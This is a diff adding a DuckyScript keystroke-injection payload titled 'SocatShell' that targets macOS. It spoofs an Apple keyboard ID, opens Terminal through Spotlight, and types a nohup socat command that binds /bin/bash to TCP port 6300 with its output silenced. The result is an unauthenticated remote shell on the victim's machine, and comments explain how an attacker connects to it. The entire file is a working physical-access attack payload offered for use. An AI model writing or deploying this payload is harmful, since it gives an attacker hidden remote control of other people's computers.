@@ -1,0 +1,34 @@
+REM This script sets up a TCP listener using socat for remote shell access.
+REM It listens on the specified port (6300) and forks a new process for each incoming connection.
+REM The EXEC parameter specifies the command to execute when a connection is established.
+
+
+
+REM Requirement: i.p. of target MacOs and socat application
+REM can install using homebrew 'brew install socat'
+
+REM once this script is executed there will be an open listener on port 6300
+REM you will be able to use the command 'socat STDIN TCP:<remote_ip_address>:6300'
+REM will establish a connection to the remote computer on port 6300 
+REM and you should be able to interact with the remote shell
+
+
+REM Title: SocatShell
+REM Author: NARSTY
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Execution
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 500
+STRING nohup socat TCP-LISTEN:6300 EXEC:/bin/bash &>/dev/null &
+DELAY 2500
+ENTER
+
